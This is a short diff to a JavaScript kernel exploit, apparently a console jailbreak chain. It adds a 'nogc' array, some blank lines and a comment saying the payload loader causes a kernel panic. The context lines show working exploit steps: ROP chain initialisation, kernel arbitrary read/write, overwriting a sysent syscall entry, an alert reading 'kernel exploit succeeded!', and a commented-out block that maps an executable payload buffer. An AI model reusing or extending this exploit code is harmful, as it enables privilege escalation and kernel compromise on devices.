@@ -142,7 +142,9 @@ const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
+var nogc = [];
 let chain = null;
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1469,6 +1471,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write64(w_rthdr_p, 0);
     log('corrupt pointers cleaned');
 
+    
     /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
@@ -1605,6 +1608,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    
     alert("kernel exploit succeeded!");
 }
 
@@ -1739,6 +1743,7 @@ export async function kexploit() {
     }
 }
 
+//For some reason this payload loader version does KP. 
 /*kexploit().then(() => {
     var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
     var payload_loader = new View4(window.pld);
